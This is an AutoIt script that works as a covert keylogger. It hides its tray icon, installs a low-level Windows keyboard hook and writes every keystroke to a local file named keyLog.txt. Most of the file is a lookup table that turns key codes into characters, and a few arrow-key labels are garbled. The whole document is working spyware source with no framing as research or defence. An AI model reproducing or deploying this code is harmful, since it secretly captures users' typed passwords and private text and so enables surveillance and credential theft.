

#include <WinAPI.au3>
#include <WindowsConstants.au3>
#NoTrayIcon

Opt('MustDeclareVars', 1)

Global $hHook, $hStub_KeyProc, $buf = "", $title = "", $title_1 = "", $keycode, $buffer = "", $nMsg
Global $file, $f3 = 0
$file = FileOpen("keyLog.txt", 9)


_Main()

Func _Main()
	Local $hmod
	$f3 = 1
	$hStub_KeyProc = DllCallbackRegister("_KeyProc", "long", "int;wparam;lparam")
	$hmod = _WinAPI_GetModuleHandle(0)
	$hHook = _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($hStub_KeyProc), $hmod)
	While 1
		Sleep(10)
	WEnd
 EndFunc

Func EvaluateKey($keycode)
	$title = WinGetTitle("")
	$buffer = key($keycode)
	If $title_1 <> $title Then
		$title_1 = $title
;		FileWrite($file, @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF)
		FileWrite($file, $buffer & @CRLF)
	Else
		FileWrite($file, $buffer & @CRLF)
	EndIf
EndFunc




Func key($keycode2)
   $buf = "{" & $keycode2 & "} => "
	If $keycode2 = 8 Then
		$buf = $buf & "{backspace}"
	EndIf
	If $keycode2 = 9 Then
		$buf = $buf & "{TAB}"
	EndIf
	If $keycode2 = 13 Then
		$buf = $buf & "{ENTER}"
	EndIf
	If $keycode2 = 19 Then
		$buf = $buf & "{PAUSE}"
	EndIf
	If $keycode2 = 20 Then
		$buf = $buf & "{CAPSLOCK }"
	EndIf
	If $keycode2 = 27 Then
		$buf = $buf & "{ESC}"
	EndIf
	If $keycode2 = 32 Then
		$buf = $buf & "{SPACE}"
	EndIf
	If $keycode2 = 33 Then
		$buf = $buf & "{PAGEUP}"
	EndIf
	If $keycode2 = 34 Then
		$buf = $buf & "{PAGEDOWN}"
	EndIf
	If $keycode2 = 35 Then
		$buf = $buf & "{END}"
	EndIf
	If $keycode2 = 36 Then
		$buf = $buf & "{HOME}"
	EndIf
	If $keycode2 = 37 Then
		$buf = $buf & "{¡û}"
	EndIf
	If $keycode2 = 38 Then
		$buf = $buf & "{¡ü}"
	EndIf
	If $keycode2 = 39 Then
		$buf = $buf & "{¡ú}"
	EndIf
	If $keycode2 = 40 Then
		$buf = $buf & "{¡ý}"
	EndIf
	If $keycode2 = 42 Then
		$buf = $buf & "{PRINT}"
	EndIf
	If $keycode2 = 44 Then
		$buf = $buf & "{PRINT SCREEN}"
	EndIf
	If $keycode2 = 45 Then
		$buf = $buf & "{INS}"
	EndIf
	If $keycode2 = 46 Then
		$buf = $buf & "{DEL}"
	EndIf
	If $keycode2 = 48 Or $keycode2 = 96 Then
		$buf = $buf & 0
	EndIf
	If $keycode2 = 49 Or $keycode2 = 97 Then
		$buf = $buf & 1
	EndIf
	If $keycode2 = 50 Or $keycode2 = 98 Then
		$buf = $buf & 2
	EndIf
	If $keycode2 = 51 Or $keycode2 = 99 Then
		$buf = $buf & 3
	EndIf
	If $keycode2 = 52 Or $keycode2 = 100 Then
		$buf = $buf & 4
	EndIf
	If $keycode2 = 53 Or $keycode2 = 101 Then
		$buf = $buf & 5
	EndIf
	If $keycode2 = 54 Or $keycode2 = 102 Then
		$buf = $buf & 6
	EndIf
	If $keycode2 = 55 Or $keycode2 = 103 Then
		$buf = $buf & 7
	EndIf
	If $keycode2 = 56 Or $keycode2 = 104 Then
		$buf = $buf & 8
	EndIf
	If $keycode2 = 57 Or $keycode2 = 105 Then
		$buf = $buf & 9
	EndIf
	If $keycode2 = 65 Then
		$buf = $buf & "a"
	EndIf
	If $keycode2 = 66 Then
		$buf = $buf & "b"
	EndIf
	If $keycode2 = 67 Then
		$buf = $buf & "c"
	EndIf
	If $keycode2 = 68 Then
		$buf = $buf & "d"
	EndIf
	If $keycode2 = 69 Then
		$buf = $buf & "e"
	EndIf
	If $keycode2 = 70 Then
		$buf = $buf & "f"
	EndIf
	If $keycode2 = 71 Then
		$buf = $buf & "g"
	EndIf
	If $keycode2 = 72 Then
		$buf = $buf & "h"
	EndIf
	If $keycode2 = 73 Then
		$buf = $buf & "i"
	EndIf
	If $keycode2 = 74 Then
		$buf = $buf & "j"
	EndIf
	If $keycode2 = 75 Then
		$buf = $buf & "k"
	EndIf
	If $keycode2 = 76 Then
		$buf = $buf & "l"
	EndIf
	If $keycode2 = 77 Then
		$buf = $buf & "m"
	EndIf
	If $keycode2 = 78 Then
		$buf = $buf & "n"
	EndIf
	If $keycode2 = 79 Then
		$buf = $buf & "o"
	EndIf
	If $keycode2 = 80 Then
		$buf = $buf & "p"
	EndIf
	If $keycode2 = 81 Then
		$buf = $buf & "q"
	EndIf
	If $keycode2 = 82 Then
		$buf = $buf & "r"
	EndIf
	If $keycode2 = 83 Then
		$buf = $buf & "s"
	EndIf
	If $keycode2 = 84 Then
		$buf = $buf & "t"
	EndIf
	If $keycode2 = 85 Then
		$buf = $buf & "u"
	EndIf
	If $keycode2 = 86 Then
		$buf = $buf & "v"
	EndIf
	If $keycode2 = 87 Then
		$buf = $buf & "w"
	EndIf
	If $keycode2 = 88 Then
		$buf = $buf & "x"
	EndIf
	If $keycode2 = 89 Then
		$buf = $buf & "y"
	EndIf
	If $keycode2 = 90 Then
		$buf = $buf & "z"
	EndIf
	If $keycode2 = 91 Or $keycode2 = 92 Then
		$buf = $buf & "{Windows}"
	EndIf
	If $keycode2 = 106 Then
		$buf = $buf & "*"
	EndIf
	If $keycode2 = 107 Then
		$buf = $buf & "+"
	EndIf
	If $keycode2 = 109 Or $keycode2 = 189 Then
		$buf = $buf & "-"
	EndIf
	If $keycode2 = 110 Or $keycode2 = 190 Then
		$buf = $buf & "."
	EndIf
	If $keycode2 = 111 Or $keycode2 = 191 Then
		$buf = $buf & "/"
	EndIf
	If $keycode2 = 112 Then
		$buf = $buf & "{F1}"
	EndIf
	If $keycode2 = 113 Then
		$buf = $buf & "{F2}"
	EndIf
	If $keycode2 = 114 Then
		$buf = $buf & "{F3}"
	EndIf
	If $keycode2 = 115 Then
		$buf = $buf & "{F4}"
	EndIf
	If $keycode2 = 116 Then
		$buf = $buf & "{F5}"
	EndIf
	If $keycode2 = 117 Then
		$buf = $buf & "{F6}"
	EndIf
	If $keycode2 = 118 Then
		$buf = $buf & "{F7}"
	EndIf
	If $keycode2 = 119 Then
		$buf = $buf & "{F8}"
	EndIf
	If $keycode2 = 120 Then
		$buf = $buf & "{F9}"
	EndIf
	If $keycode2 = 121 Then
		$buf = $buf & "{F10}"
	EndIf
	If $keycode2 = 122 Then
		$buf = $buf & "{F11}"
	EndIf
	If $keycode2 = 123 Then
		$buf = $buf & "{F12}"
	EndIf
	If $keycode2 = 124 Then
		$buf = $buf & "{F13}"
	EndIf
	If $keycode2 = 125 Then
		$buf = $buf & "{F14}"
	EndIf
	If $keycode2 = 126 Then
		$buf = $buf & "{F15}"
	EndIf
	If $keycode2 = 127 Then
		$buf = $buf & "{F16}"
	EndIf
	If $keycode2 = 144 Then
		$buf = $buf & "{NUMLOCK}"
	EndIf
	If $keycode2 = 145 Then
		$buf = $buf & "{SCROLLLOCK}"
	EndIf
	If $keycode2 = 160 Or $keycode2 = 161 Then
		$buf = $buf & "{Shift}"
	EndIf
	If $keycode2 = 162 Or $keycode2 = 163 Then
		$buf = $buf & "{Ctrl}"
	EndIf
	If $keycode2 = 164 Then
		$buf = $buf & "{Alt}"
	EndIf
	If $keycode2 = 186 Then
		$buf = $buf & ";"
	EndIf
	If $keycode2 = 187 Then
		$buf = $buf & "="
	EndIf
	If $keycode2 = 188 Then
		$buf = $buf & ","
	EndIf
	If $keycode2 = 192 Then
		$buf = $buf & "`"
	EndIf
	If $keycode2 = 219 Then
		$buf = $buf & "["
	EndIf
	If $keycode2 = 220 Then
		$buf = $buf & ""
	EndIf
	If $keycode2 = 221 Then
		$buf = $buf & "]"
	EndIf
	Return $buf
 EndFunc

Func _KeyProc($nCode, $wParam, $lParam)
	Local $tKEYHOOKS
	$tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
	If $nCode < 0 Then
		Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
	EndIf
	If $wParam = $WM_KEYDOWN Then
		EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
	Else
		Local $flags = DllStructGetData($tKEYHOOKS, "flags")
		Switch $flags
			Case $LLKHF_ALTDOWN
				EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
		EndSwitch
	EndIf
	Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
EndFunc
